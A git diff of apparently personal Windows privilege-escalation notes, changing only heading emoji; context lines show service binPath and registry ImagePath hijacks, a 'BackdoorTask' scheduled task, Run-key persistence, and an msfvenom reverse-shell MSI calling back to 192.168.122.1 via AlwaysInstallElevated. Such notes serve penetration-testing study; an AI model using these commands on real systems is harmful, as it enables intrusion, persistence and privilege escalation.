@@ -80,7 +80,7 @@ cacls "C:\Python27"
 # ⭐⭐ Services ⭐⭐ 
 - Is there a service that runs as SYSTEM but is writable by all logged-on users?  (NT AUTHORITY\INTERACTIVE)
 
-## ⚠️Manage Service⚠️ 
+## 💠Manage Service💠 
 ```
 Get-Service
 Get-Service | Select-Object Displayname,Status,ServiceName,Can*
@@ -109,7 +109,7 @@ sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
 sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
 ```
 
-## ⚠️Weak Permissins on Service⚠️ 
+## 💠Weak Permissins on Service💠 
 
  Use the `accesschk64' program to check if we have privileges over that process.
 
@@ -152,7 +152,7 @@ accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
-## ⚠️Weak Permission on Service Binary⚠️ 
+## 💠Weak Permission on Service Binary💠 
 ```
 🔺Get binary path
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -173,13 +173,13 @@ sc.exe stop SimpleService
 sc.exe start SimpleService
 ```
 
-## ⚠️Unquoted Service Path⚠️ 
+## 💠Unquoted Service Path💠 
 ```
 C:\Users\Quickemu\Downloads\Example Directory\Another.exe
 C:\Users\Quickemu\Downloads\Example.exe
 ```
 
-## ⚠️Weak Registry Permissions⚠️ 
+## 💠Weak Registry Permissions💠 
 ```
 🔺Is SERVICE_START_NAME = LocalSystem? -> SYSTEM Privileges?
 sc.exe qc <SERVICE>
@@ -194,7 +194,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 net start regsvc
 ```
 
-## ⚠️Service ImagePath⚠️
+## 💠Service ImagePath💠
 ```
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\simpleService.exe"
 Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
@@ -266,7 +266,7 @@ schtasks /run /tn "BackdoorTask"
 
 # ⭐⭐ Registry⭐⭐
 
-## ⚠️AutoRuns⚠️
+## 💠AutoRuns💠
 Run
 ```
 🔺 Query the registry for AutoRun executables:
@@ -297,7 +297,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
 ```
 
-## ⚠️AlwaysInstallElevated⚠️
+## 💠AlwaysInstallElevated💠
 ```
 🔺Check if Always install Evalated is activated:
 Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
@@ -310,7 +310,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi 
 msiexec /quiet /qn /i sample.msi
 ```
 
-## ⚠️UAC Bypass⚠️
+## 💠UAC Bypass💠
 
 
 UAC can have different configuration levels:
